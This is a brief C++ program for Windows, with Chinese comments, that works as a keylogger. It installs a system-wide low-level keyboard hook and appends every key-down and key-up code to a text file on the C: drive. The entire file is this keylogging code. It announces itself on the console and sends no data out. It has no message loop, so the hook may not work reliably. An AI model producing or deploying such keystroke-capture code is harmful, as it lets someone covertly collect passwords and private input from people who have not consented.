#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

// 全局变量，用于保存键盘钩子句柄
HHOOK hHook = NULL;

// 文件路径，保存键盘记录
const char* logFile = "C:\\keyboard_log.txt";

// 键盘事件处理函数（钩子过程）
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // nCode >= 0 表示事件已被处理
    if (nCode >= 0) {
        // wParam 指示事件类型（WM_KEYDOWN、WM_KEYUP）
        KBDLLHOOKSTRUCT* pKbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        // 打开记录文件，追加写入键盘事件信息
        ofstream logStream(logFile, ios_base::app);
        if (logStream.is_open()) {
            if (wParam == WM_KEYDOWN) {
                logStream << "Key Down: " << pKbdStruct->vkCode << endl;
            } else if (wParam == WM_KEYUP) {
                logStream << "Key Up: " << pKbdStruct->vkCode << endl;
            }
            logStream.close();
        }
    }

    // 将事件传递给下一个钩子或默认处理过程
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// 安装键盘钩子
bool InstallHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    return (hHook != NULL);
}

// 卸载键盘钩子
void UninstallHook() {
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

int main() {
    // 安装钩子
    if (!InstallHook()) {
        cout << "Failed to install hook!" << endl;
        return 1;
    }

    cout << "Keyboard logger is running. Press any key to exit..." << endl;
    cin.get(); // 等待用户按键

    // 卸载钩子
    UninstallHook();
    cout << "Keyboard logger stopped." << endl;

    return 0;
}
